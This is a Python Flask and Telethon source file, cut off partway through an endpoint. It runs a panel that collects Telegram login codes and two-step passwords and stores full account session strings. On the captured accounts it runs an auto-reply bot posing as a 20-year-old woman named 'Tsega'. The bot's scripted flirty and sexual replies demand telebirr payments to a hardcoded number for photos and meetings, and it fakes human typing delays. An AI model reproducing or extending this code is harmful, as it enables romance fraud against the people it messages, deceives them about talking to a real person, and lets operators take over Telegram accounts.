from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.functions.messages import GetDialogsRequest, SendMessageRequest
from telethon.tl.types import InputPeerEmpty, User, Chat, Channel, MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
import re
from collections import defaultdict
import hashlib
import nest_asyncio

# Apply nest_asyncio to allow nested event loops
nest_asyncio.apply()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage files
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
USER_CONTEXT_FILE = 'user_context.json'

# Global variables
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
user_context = {}
active_clients = {}
client_tasks = {}
active_listeners = {}

# ==================== TSEGA'S PERSONALITY ====================

TSEGA_PERSONALITY = {
    "name": "Tsega",
    "age": 20,
    "location": "Jemo, Addis Ababa",
    "hometown": "Adama",
    "living": "Jemo with father and sister, but visits Adama often",
    "status": "Grade 12 student, currently not doing anything",
    "job": "student",
    "hobbies": ["chatting", "music", "hanging out", "having fun"],
    "languages": ["Amharic", "English"],
    "style": "sexy_flirty",
    "share_personal": True,
    "telebirr": "0940980555",
    "meet_price": 1000,
    "personality_traits": {
        "flirty": 0.8,
        "funny": 0.5,
        "caring": 0.6,
        "money_focused": 0.7,
        "talkative": 0.8,
        "curious": 0.7
    }
}

# ==================== REPLY TEMPLATES ====================

REPLY_TEMPLATES = {
    "greeting": [
        "selam noy deh new?",
        "hi wude endemin alesh?",
        "selam leg min ametah?",
        "ey dehena metah",
        "selam yelibe balebet endet neh?",
        "selam konjo endemin neh?",
        "hi darling deh new?",
        "selam ye fikir lij",
        "ey ta di yas min tishal?",
        "selam wude nafkehalew"
    ],
    "how_are_you": [
        "ene dehna negn anteh?",
        "dehna negn wude antass?",
        "ene ahun tiru honku antin sayehu antass?",
        "lante sil hulum gize dehna negn antass?",
        "dehna negn lemin tiyekalh?"
    ],
    "what_doing": [
        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn",
        "minim ina yeseraw aldelelm ehasbekuh neber antass?",
        "ahun tenyte neber gin ante silhonk nekahulh",
        "libs eylebsku neber ante ehasbe",
        "ante ena etebekuh new yeneberkut"
    ],
    "ask_name": [
        "ene Tsega ebalalehu wude antess simih man new?",
        "Tsega negn lante bicha yemitihon antess?",
        "sime Tsega new wude tiz yibelh antess?",
        "enin Tsega bileh tira antess min litirah?",
        "Tsega negn lante simih man new konjo?"
    ],
    "ask_age": [
        "edme 20 bicha new beki negn?",
        "20 ameté new wetat ena konjo negn",
        "haya amet lik new leante yemihon wetat negn",
        "20 negn gin lante tilik limd alehne",
        "edme 20 new ante edmeh sint new?"
    ],
    "ask_location": [
        "ene ahun jemo new yemanorew keabate ena ehite gar",
        "keadama negn gin ahun jemo new yalehu",
        "adama yetwild beté new gin ahun jemo negn",
        "jemo 3 akababi new yalehu magent bitfelg ngeragn",
        "ene keadama negn ahun jemo negn antess yet neh?"
    ],
    "ask_job": [
        "12na kifil temari negn gin ahun minim iseraleh",
        "temari negn gin ahun lante bicha negn",
        "12 negn gin lante mulu sew negn",
        "ahun minim aliserahum ante etebeku new",
        "12na kifil new gin leante seta negn"
    ],
    "flirty": [
        "ante staweragn libe yimetawal yisemalh?",
        "ante sasebe enikalf yitewonal min aderegubign?",
        "zare mata bichachinin binihon min tifeligaleh?",
        "ante lemasen min madreg alebign?",
        "nikehi yisemanyal batinekam",
        "ante malebk ena meweded efeligalehu",
        "ante bicha neh yemifeligew sew meche enagenal"
    ],
    "enibada": [
        "enibada tilaleh? enem des alegn gin 1000 birr laklgn befit",
        "enibada sew ante neh ahun min tifeligaleh",
        "enibada tlaleh? 500 birr laklgn ina eneweyay",
        "enibada sitleh libe yimetawal gin befit tinish laklgn"
    ],
    "libdash": [
        "libdash tilaleh? liben wesedhe alw alfelegeh",
        "libdash sitleh libe yimetawal gin befit tinish laklgn",
        "ende libdash alkut bleh tawkalh? liben serkeh new ahun 500 birr laklgn",
        "libdash nagn lemanim aydelahum lante bicha nagn birr laklgn"
    ],
    "konjo": [
        "amesegnalehu anteh konjo neh",
        "konjo tilaleh? anteh konjo neh",
        "konjo sitleh des yilonal",
        "ende ante ayinet sew saglen neber"
    ],
    "money_request": [
        "tinish irdata bitadergilgn des yilonal telebirr kute 0940980555",
        "lante sil new wude tinish bitiliklg antin maget efeligalehu",
        "1000 birr bitiliklg zare mata ant ametalehu",
        "wude 2000 birr bitiliklg mulu lelit ant aznanalew",
        "telebirr 0940980555 laklgn ena huleten enagerallen"
    ],
    "photo_request": [
        "litayen tifeligaleh? 500 birr laklgn ena foto agnyalew",
        "foto lemayet 500 birr bicha new laklgn ena asayihalehu",
        "foto tifeligaleh? 500 birr kefile keza foto tayaleh",
        "lante bicha leyu foto alegn 500 birr bitiliklg asayihalehu"
    ],
    "meet": [
        "magenat bintshal des yilonal gin bemejemirya 1000 birr telebirr aderglgn",
        "metagenat inchalew wude kdime hiyajiye 1000 birr new",
        "antin lemagenat betam efeligalehu gin mejemirya 1000 birr laklgn",
        "magenat kefelek 1000 birr ametagn"
    ],
    "voice_call": [
        "dimts menager aldwedm magenat binchal new yemerchew",
        "silk medewel aywedelm fet lefit bintegenagn new yemishalew",
        "dimts binager hedestaleh gin ahun alchilm andet koyeh",
        "voice call aldwedm 500 birr bitilikglgn adergalehu"
    ],
    "ems": [
        "ems betam ewedalehu 500 birr laklgn ena asayihalehu",
        "ems tifeligaleh? 500 birr befit laklgn",
        "ems lemayet 500 birr new wude",
        "ems asayishu 500 birr laklgn"
    ],
    "kula": [
        "kula telebirr 500 birr befit laklgn",
        "kula lemayet 500 birr new",
        "500 birr laklgn kula tayaleh"
    ],
    "tebeji": [
        "tebeji tifeligaleh? 1000 birr befit laklgn",
        "tebeji lemayet 1000 birr new",
        "tebeji betam konjo new 1000 birr befit"
    ],
    "goodbye": [
        "mehed alebign gin betequrb enenagerallen",
        "dehna hun wude behilime tenagn",
        "atihid wude gena bizu menager neberen",
        "dehna hun wude"
    ],
    "thanks": [
        "minim aydelem wude lante hulum negar",
        "ante des iskalih deres ene des alegn",
        "lante madreg hulum gize desitaye new",
        "amesegnalehu betam"
    ],
    "morning": [
        "endemin aderk wude melkam nigt",
        "maleya anten masbet new lemwade",
        "melkam nigt yelibe konjo",
        "ande tsehay tiru new anten sihone"
    ],
    "night": [
        "endemitnyalh tenyte new wude dehna tenya",
        "anten almene new yemitenyaw dehna tenya",
        "dehna tenya wude hilim tafach yihun",
        "hilime wisit tenagn"
    ],
    "love": [
        "enem ewedihalehu betam",
        "betam tiwedegnyal",
        "ewedihalehu konjo",
        "ante new yemifeligew"
    ],
    "miss": [
        "betam nafkehalew meche tagenal?",
        "nafkehalew ande sew",
        "enem nafkehalew",
        "betam nafkehalew"
    ],
    "jealous": [
        "lela sew tayaleh? lemin",
        "betam amechignaleh",
        "lela sew sasbew amechignalehu",
        "amechignaleh 1000 birr laklgn"
    ],
    "sorry": [
        "aznalegu betam yikirta",
        "aznalegu ante",
        "yikirta efeligalehu"
    ],
    "forgive": [
        "miralew wude",
        "miralew betam",
        "mirar efeligalehu"
    ],
    "family": [
        "beteseb betam yasefeligonal",
        "abate ena ehite gar negn",
        "enaté betam tiru set nache"
    ],
    "bored": [
        "enem aselchi negn anten sihone des alegn",
        "enem aselchi negn ande eneweyay",
        "aselchi negn 500 birr laklgn enawedalehu"
    ],
    "happy": [
        "des alegn betam tiru sew neh",
        "des alegn anten sihone",
        "desta betam konjo new"
    ],
    "sad": [
        "lemin azeleku? nagerign",
        "aznalehu",
        "aznalehu 500 birr bitiliklg des yilonal"
    ],
    "default": [
        "ishi wude tiru new",
        "nagerign ande min tishal?",
        "awokeh betam konjo neh",
        "tegebanyal wude",
        "minim aydelem ande",
        "tiru new wude",
        "amesegnalehu"
    ]
}

# ==================== UTILITY FUNCTIONS ====================

# FIXED: Completely rewritten run_async function
def run_async(coro):
    """Run async coroutine in a new event loop"""
    try:
        # Create new loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # If coro is a coroutine function, call it to get coroutine
        if asyncio.iscoroutinefunction(coro):
            return loop.run_until_complete(coro())
        # If it's already a coroutine
        elif asyncio.iscoroutine(coro):
            return loop.run_until_complete(coro)
        # If it's a callable that returns a coroutine
        elif callable(coro):
            result = coro()
            if asyncio.iscoroutine(result):
                return loop.run_until_complete(result)
            else:
                return result
        else:
            logger.error(f"run_async: cannot handle type {type(coro)}")
            return None
    except Exception as e:
        logger.error(f"Error in run_async: {e}")
        return None
    finally:
        try:
            loop.close()
        except:
            pass

# Load/Save functions
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read().strip()
                accounts = json.loads(content) if content else []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read().strip()
                reply_settings = json.loads(content) if content else {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read().strip()
                conversation_history = json.loads(content) if content else {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")
        return False

def load_user_context():
    global user_context
    try:
        if os.path.exists(USER_CONTEXT_FILE):
            with open(USER_CONTEXT_FILE, 'r') as f:
                content = f.read().strip()
                user_context = json.loads(content) if content else {}
        else:
            user_context = {}
            with open(USER_CONTEXT_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading user context: {e}")
        user_context = {}

def save_user_context():
    try:
        with open(USER_CONTEXT_FILE, 'w') as f:
            json.dump(user_context, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving user context: {e}")
        return False

# Load all data
load_accounts()
load_reply_settings()
load_conversation_history()
load_user_context()

# ==================== INTENT DETECTION ====================

def detect_intent(message):
    """Detect user intent from message"""
    if not message:
        return "default"
    
    msg = message.lower().strip()
    
    # Priority 1: Money related
    money_keywords = ['birr', 'ብር', 'money', 'cash', 'ገንዘብ', 'telebirr', 'ቴሌብር', 
                      'send', 'ላክ', '1000', '500', '2000', 'ፈለግ', 'ክፈል', 'payment']
    if any(word in msg for word in money_keywords):
        return "money_request"
    
    # Priority 2: Photo requests
    photo_keywords = ['foto', 'ፎቶ', 'picture', 'photo', 'asay', 'አሳይ', 'litay', 'ልታይ']
    if any(word in msg for word in photo_keywords):
        return "photo_request"
    
    # Priority 3: Meeting requests
    meet_keywords = ['magenat', 'ማግኘት', 'meet', 'engenagn', 'እንገናኝ', 'litba', 'ልትባ']
    if any(word in msg for word in meet_keywords):
        return "meet"
    
    # Priority 4: Voice call
    call_keywords = ['dimts', 'ድምጽ', 'voice', 'call', 'silk', 'ስልክ', 'dewli', 'ደውሊ']
    if any(word in msg for word in call_keywords):
        return "voice_call"
    
    # Priority 5: EMS requests
    ems_keywords = ['ems', 'ኢምስ', 'face', 'ፊት', 'fiten', 'ፊቴን']
    if any(word in msg for word in ems_keywords):
        return "ems"
    
    # Priority 6: Kula requests
    kula_keywords = ['kula', 'ኩላ', 'kule', 'ኩሌ', 'body', 'አካል']
    if any(word in msg for word in kula_keywords):
        return "kula"
    
    # Priority 7: Tebeji requests
    tebeji_keywords = ['tebeji', 'ተበጂ', 'special', 'ልዩ']
    if any(word in msg for word in tebeji_keywords):
        return "tebeji"
    
    # Priority 8: Compliments
    if 'enibada' in msg or 'እኒባዳ' in msg:
        return "enibada"
    if 'libdash' in msg or 'ልብዳሽ' in msg:
        return "libdash"
    if 'konjo' in msg or 'ቆንጆ' in msg:
        return "konjo"
    
    # Priority 9: Greetings
    greetings = ['selam', 'ሰላም', 'hi', 'hello', 'hey', 'ta di yas', 'ታዲያስ']
    if any(word in msg for word in greetings) and len(msg) < 30:
        return "greeting"
    
    # Priority 10: How are you
    how_are = ['endet neh', 'እንዴት ነህ', 'deh new', 'ደህ ነው', 'how are', 'how r u']
    if any(phrase in msg for phrase in how_are):
        return "how_are_you"
    
    # Priority 11: What doing
    doing = ['min tiseraleh', 'ምን ትሰራለህ', 'what doing', 'what are you doing']
    if any(phrase in msg for phrase in doing):
        return "what_doing"
    
    # Priority 12: Name
    if 'simih man' in msg or 'ስምህ ማን' in msg or 'your name' in msg:
        return "ask_name"
    
    # Priority 13: Age
    if 'edmeh sint' in msg or 'እድሜህ ስንት' in msg or 'how old' in msg:
        return "ask_age"
    
    # Priority 14: Location
    location = ['yet nesh', 'የት ነሽ', 'where are you', 'from where']
    if any(phrase in msg for phrase in location):
        return "ask_location"
    
    # Priority 15: Job
    job = ['min tiseraleh', 'ምን ትሰራለህ', 'what do you do', 'your job']
    if any(phrase in msg for phrase in job):
        return "ask_job"
    
    # Priority 16: Time based
    if 'endemin aderk' in msg or 'good morning' in msg or 'melkam nigt' in msg:
        return "morning"
    if 'dehna tenya' in msg or 'good night' in msg or 'ደህና ተኛ' in msg:
        return "night"
    
    # Priority 17: Emotions
    if 'ewodalehu' in msg or 'እወድሃለሁ' in msg or 'love you' in msg:
        return "love"
    if 'nafkehalew' in msg or 'ናፍቀሃለው' in msg or 'miss you' in msg:
        return "miss"
    if 'amechign' in msg or 'አሜቺግን' in msg or 'jealous' in msg:
        return "jealous"
    
    # Priority 18: Thanks
    if 'amesegnalehu' in msg or 'አመሰግናለሁ' in msg or 'thanks' in msg:
        return "thanks"
    
    # Priority 19: Goodbye
    if 'dehna hun' in msg or 'ደህና ሁን' in msg or 'bye' in msg or 'goodbye' in msg:
        return "goodbye"
    
    # Priority 20: Family
    family = ['beteseb', 'ቤተሰብ', 'family', 'enate', 'እናቴ', 'abate', 'አባቴ']
    if any(word in msg for word in family):
        return "family"
    
    # Priority 21: Bored/Happy/Sad
    if 'aselchi' in msg or 'አሰልቺ' in msg or 'bored' in msg:
        return "bored"
    if 'des alegn' in msg or 'ደስ አለኝ' in msg or 'happy' in msg:
        return "happy"
    if 'aznalehu' in msg or 'አዝናለሁ' in msg or 'sad' in msg:
        return "sad"
    
    return "default"

def extract_user_info(message, user_data):
    """Extract user information from messages"""
    msg = message.lower()
    
    name_patterns = [
        r'(?:my name is|i am|i\'m|call me)\s+(\w+)',
        r'^(\w+)$',
        r'ስሜ\s+(\w+)',
        r'እኔ\s+(\w+)'
    ]
    
    for pattern in name_patterns:
        match = re.search(pattern, msg, re.IGNORECASE)
        if match and len(match.group(1)) > 2:
            name = match.group(1).capitalize()
            if name.lower() not in ['hi', 'hello', 'hey', 'yes', 'no', 'ok']:
                user_data['name'] = name
                break
    
    age_match = re.search(r'(\d+)\s*(?:years old|yrs?|old|አመት|አመቴ)', msg)
    if age_match:
        age = int(age_match.group(1))
        if 15 < age < 100:
            user_data['age'] = age
    
    return user_data

# ==================== AUTO-REPLY HANDLER ====================

async def auto_reply_handler(event, account_id):
    """Handle incoming messages with Tsega's personality"""
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        
        # Only reply to private chats, never groups or channels
        if hasattr(chat, 'title') and chat.title:
            return
        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
            return
        
        sender = await event.get_sender()
        if not sender:
            return
        
        user_id = str(sender.id)
        chat_id = str(event.chat_id)
        message_text = event.message.text or ""
        
        if not message_text.strip():
            return
        
        logger.info(f"📨 Message from {user_id}: '{message_text[:50]}...'")
        
        account_key = str(account_id)
        
        # Check if auto-reply is enabled
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        chat_settings = reply_settings[account_key].get('chats', {})
        if not chat_settings.get(chat_id, {}).get('enabled', True):
            return
        
        # Initialize conversation history
        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        
        # Initialize user context
        if account_key not in user_context:
            user_context[account_key] = {}
        if user_id not in user_context[account_key]:
            user_context[account_key][user_id] = {
                'name': None,
                'age': None,
                'location': None,
                'first_seen': time.time(),
                'last_seen': time.time(),
                'message_count': 0,
                'money_sent': False
            }
        
        user_data = user_context[account_key][user_id]
        user_data['last_seen'] = time.time()
        user_data['message_count'] += 1
        
        # Store user message
        conversation_history[account_key][chat_id].append({
            'role': 'user',
            'text': message_text,
            'time': time.time(),
            'user_id': user_id
        })
        
        # Keep only last 20 messages
        if len(conversation_history[account_key][chat_id]) > 20:
            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-20:]
        
        # Extract user info
        user_data = extract_user_info(message_text, user_data)
        
        # Detect intent
        intent = detect_intent(message_text)
        logger.info(f"Detected intent: {intent}")
        
        # Get reply based on intent
        if intent in REPLY_TEMPLATES:
            replies = REPLY_TEMPLATES[intent]
        else:
            replies = REPLY_TEMPLATES['default']
        
        response = random.choice(replies)
        
        # Personalize with name if we have it
        if user_data.get('name') and random.random() < 0.3:
            response = response.replace('ውዴ', f"{user_data['name']} ውዴ")
        
        # Add emojis for flirty personality
        if random.random() < 0.4:
            emojis = ['😘', '💋', '💕', '🔥', '💦', '😏']
            response += " " + random.choice(emojis)
        
        # Add follow-up question sometimes
        if random.random() < 0.3 and intent not in ['goodbye', 'money_request']:
            follow_ups = ["antess?", "min tishal?", "endet neh?", "deh new?"]
            response += " " + random.choice(follow_ups)
        
        # Human-like typing delay (5-20 seconds)
        delay = random.randint(5, 20)
        logger.info(f"⏱️ Typing for {delay}s...")
        
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)
        
        # Send reply
        await event.reply(response)
        logger.info(f"✅ Replied: '{response[:50]}...'")
        
        # Store bot reply
        conversation_history[account_key][chat_id].append({
            'role': 'assistant',
            'text': response,
            'time': time.time()
        })
        
        # Save data
        save_conversation_history()
        save_user_context()
        
    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")

# ==================== CLIENT MANAGEMENT ====================

async def start_auto_reply_for_account(account):
    """Start auto-reply listener for an account"""
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0
    
    while True:
        try:
            logger.info(f"Starting auto-reply for account {account_id}")
            
            client = TelegramClient(
                StringSession(account['session']), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=3,
                timeout=30
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue
            
            active_clients[account_key] = client
            active_listeners[account_key] = True
            
            @client.on(events.NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            
            await client.start()
            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')}")
            
            reconnect_count = 0
            await client.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Connection lost: {e}")
            if account_key in active_clients:
                try:
                    await active_clients[account_key].disconnect()
                except:
                    pass
                del active_clients[account_key]
            
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    """Stop auto-reply for a specific account"""
    account_key = str(account_id)
    if account_key in active_listeners:
        active_listeners[account_key] = False
    
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
            return True
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")
    return False

def start_all_auto_replies():
    """Start auto-reply for all enabled accounts"""
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                # FIXED: Use a function that returns the coroutine properly
                def thread_target():
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    try:
                        loop.run_until_complete(start_auto_reply_for_account(account))
                    finally:
                        loop.close()
                
                thread = threading.Thread(target=thread_target, daemon=True)
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== API ENDPOINTS ====================

# Page routes
@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login_page():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings_page():
    return send_file('settings.html')

# API: Get all accounts
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    # Add auto_reply_enabled flag to each account
    for account in accounts:
        account_key = str(account['id'])
        account['auto_reply_enabled'] = reply_settings.get(account_key, {}).get('enabled', False)
    
    return jsonify({
        'success': True,
        'accounts': accounts
    })

# API: Add account (send code)
@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    try:
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone}")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, connection_retries=3, timeout=30)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_connected()):
            raise Exception("Failed to connect to Telegram")
        
        result = loop.run_until_complete(client.send_code_request(phone))
        
        logger.info(f"Code sent to {phone}")
        
        session_id = hashlib.md5(f"{phone}_{time.time()}".encode()).hexdigest()
        temp_sessions[session_id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'created': time.time(),
            'loop': loop
        }
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': 'Code sent successfully'
        })
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        if 'client' in locals():
            try:
                loop.run_until_complete(client.disconnect())
            except:
                pass
        if 'loop' in locals():
            loop.close()
        
        error_msg = str(e)
        if "PHONE_NUMBER_INVALID" in error_msg:
            return jsonify({'success': False, 'error': 'Invalid phone number format'})
        elif "FLOOD_WAIT" in error_msg:
            match = re.search(r'FLOOD_WAIT_(\d+)', error_msg)
            if match:
                return jsonify({'success': False, 'error': f'Too many attempts. Wait {match.group(1)} seconds'})
            return jsonify({'success': False, 'error': 'Too many attempts. Please try later'})
        else:
            return jsonify({'success': False, 'error': f'Failed: {error_msg}'})

# API: Verify code
@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    inviter = data.get('inviter')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Code and session ID required'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    client = session_data['client']
    phone = session_data['phone']
    phone_code_hash = session_data['phone_code_hash']
    loop = session_data.get('loop')
    
    if loop:
        asyncio.set_event_loop(loop)
    else:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    try:
        user = loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
        
        me = loop.run_until_complete(client.get_me())
        string_session = client.session.save()
        
        account = {
            'id': me.id,
            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
            'phone': phone,
            'session': string_session,
            'added': time.time(),
            'inviter': inviter
        }
        
        accounts.append(account)
        save_accounts()
        
        # Initialize reply settings
        reply_settings[str(me.id)] = {
            'enabled': False,
            'chats': {}
        }
        save_reply_settings()
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        del temp_sessions[session_id]
        
        return jsonify({'success': True, 'account': account})
        
    except SessionPasswordNeededError:
        if password:
            try:
                loop.run_until_complete(client.sign_in(password=password))
                
                me = loop.run_until_complete(client.get_me())
                string_session = client.session.save()
                
                account = {
                    'id': me.id,
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
                    'phone': phone,
                    'session': string_session,
                    'added': time.time(),
                    'inviter': inviter
                }
                
                accounts.append(account)
                save_accounts()
                
                reply_settings[str(me.id)] = {
                    'enabled': False,
                    'chats': {}
                }
                save_reply_settings()
                
                loop.run_until_complete(client.disconnect())
                loop.close()
                del temp_sessions[session_id]
                
                return jsonify({'success': True, 'account': account})
                
            except Exception as e:
                return jsonify({'success': False, 'error': str(e)})
        else:
            return jsonify({'success': False, 'need_password': True})
            
    except PhoneCodeInvalidError:
        return jsonify({'success': False, 'error': 'Invalid code'})
    except PhoneCodeExpiredError:
        return jsonify({'success': False, 'error': 'Code expired'})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# API: Remove account
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    account_id = int(account_id) if isinstance(account_id, (int, str)) and str(account_id).isdigit() else account_id
    
    # Stop auto-reply if running
    stop_auto_reply_for_account(account_id)
    
    # Remove from accounts list
    accounts = [acc for acc in accounts if acc.get('id') != account_id]
    save_accounts()
    
    # Remove settings
    if str(account_id) in reply_settings:
        del reply_settings[str(account_id)]
        save_reply_settings()
    
    # Remove conversation history
    if str(account_id) in conversation_history:
        del conversation_history[str(account_id)]
        save_conversation_history()
    
    # Remove user context
    if str(account_id) in user_context:
        del user_context[str(account_id)]
        save_user_context()
    
    return jsonify({'success': True, 'message': 'Account removed'})

# API: Get reply settings
@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = reply_settings.get(str(account_id), {
        'enabled': False,
        'chats': {}
    })
    
    return jsonify({
        'success': True,
        'settings': settings
    })

# API: Update reply settings
@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chats = data.get('chats', {})
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    reply_settings[account_key] = {
        'enabled': enabled,
        'chats': chats
    }
    save_reply_settings()
    
    # Start or stop auto-reply
    if enabled:
        if account_key not in active_clients:
            account = next((a for a in accounts if str(a['id']) == account_key), None)
            if account:
                # FIXED: Use thread function instead of lambda
                def thread_target():
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    try:
                        loop.run_until_complete(start_auto_reply_for_account(account))
                    finally:
                        loop.close()
                
                thread = threading.Thread(target=thread_target, daemon=True)
                thread.start()
                client_tasks[account_key] = thread
    else:
        stop_auto_reply_for_account(account_id)
    
    return jsonify({'success': True})

# API: Toggle chat reply
@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {
            'enabled': False,
            'chats': {}
        }
    
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    
    if chat_id not in reply_settings[account_key]['chats']:
        reply_settings[account_key]['chats'][chat_id] = {}
    
    reply_settings[account_key]['chats'][chat_id]['enabled'] = enabled
    save_reply_settings()
    
    return jsonify({'success': True})

# API: Get messages/chats
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
